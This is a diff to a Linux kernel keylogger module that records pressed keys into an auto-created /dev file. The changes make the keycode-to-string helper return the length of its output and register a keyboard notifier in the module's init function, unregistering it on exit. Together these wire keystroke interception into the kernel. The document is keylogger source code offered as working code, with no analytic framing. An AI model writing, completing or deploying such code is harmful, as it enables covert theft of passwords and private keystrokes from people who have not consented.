@@ -6,7 +6,7 @@ MODULE_AUTHOR("Itay Nafrin");
 MODULE_DESCRIPTION("Registers a device number. Auto create /dev file. Add information from the keys pressed to the file.");
 
 
-void keycode_to_string(int keycode, int shift_mask, char* buf, unsigned int buf_size)
+int keycode_to_string(int keycode, int shift_mask, char* buf, unsigned int buf_size)
 {
         if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
         {
@@ -16,6 +16,7 @@ void keycode_to_string(int keycode, int shift_mask, char* buf, unsigned int buf_
 
                 len = snprintf(buf, buf_size, "%s", us_key); /* enter the key pair to buf */
         }
+	return len; 
 }
 
 int keyboard_event_handler(struct notifier_block* nblock, unsigned long code, void* _param)
@@ -84,7 +85,13 @@ static int __init keylogger_init(void) {
                 goto AddError;
         }
 
-        return 0;
+	if((register_keyboard_notifier(&keysniffer_blk) < 0))
+	{
+		printk(KERN_ALERT "Unable to load key notifier!\n");
+		return -1;
+	}
+	return 0;
+	
 AddError:
         device_destroy(my_class, dev_nr);
 FileError:
@@ -92,12 +99,14 @@ FileError:
 ClassError:
         unregister_chrdev_region(dev_nr, 1);
         return -1;
+
 }
 
 /**
  * @brief This function is called, when the module is removed from the kernel
  */
 static void __exit keylogger_exit(void) {
+	unregister_keyboard_notifier(&keysniffer_blk);
         cdev_del(&my_device);
         device_destroy(my_class, dev_nr);
         class_destroy(my_class);
